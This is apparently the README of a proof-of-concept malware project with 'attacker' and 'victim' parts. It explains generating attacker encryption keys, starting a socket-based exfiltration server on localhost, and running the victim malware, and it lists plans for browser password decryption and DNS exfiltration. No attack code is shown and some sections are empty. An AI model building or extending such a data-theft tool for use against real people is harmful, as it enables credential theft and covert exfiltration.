# Getting started

## Encryption

### for the attacker:
1. The first thing you have to do is generate a key pair for the attackers decryption/encryption

you can generate a key pair using the attacker module /attacker/attacker_modules/generate_attacker_keys.py

    python generate_attacker_keys.py

this will generate 2 keys in the attacker_modules folder.


2. Now you have to move the 2 keys out of the attacker_modules folder and to the parent directory /attacker

you can do this with the following command:

    mv private_attacker.pem ..
    mv public_attacker.pem ..

### for the victim:
1. For the victim, you have to ensure that it has the 'public_attacker.pem' key in its folder /victim/.

Make sure this is the same attacker public key as the one you generated before.

## Running the code

### folder structure:
before running the code your folder structure should look like this:

    |-/attacker/
        |- attacker_modules.py
        |- main_attacker_framework.py
        |- public_attacker.pem
        |- private_attacker.pem
    |-/victim/
        |- victim_modules
        |- main.py
        |- public_attacker.pem

### starting the attacker framework first
Firstly you have to start the attacker framework in /attacker/:

    python attacker_framework.py

This will start the socket based exfiltration server, it is default listening on your local host port 9000 as this is a proof of concept, the attacker framework will wait untill it recieves data from the victim.

### starting the victim framework
*make sure the attackers public key is in the /victim/ folder*
Now that the exfiltration server from the attacker is running you have to start a victims malware in /victim/:

    python main.py

the Malware


each victim gets a ID attached to the exfil data.

## Functionality













Wip:
- add automatic public key sending from the attacker to the victim
- add the browser password decryption module
- I would like the server to exfil over dns records instead of sockets
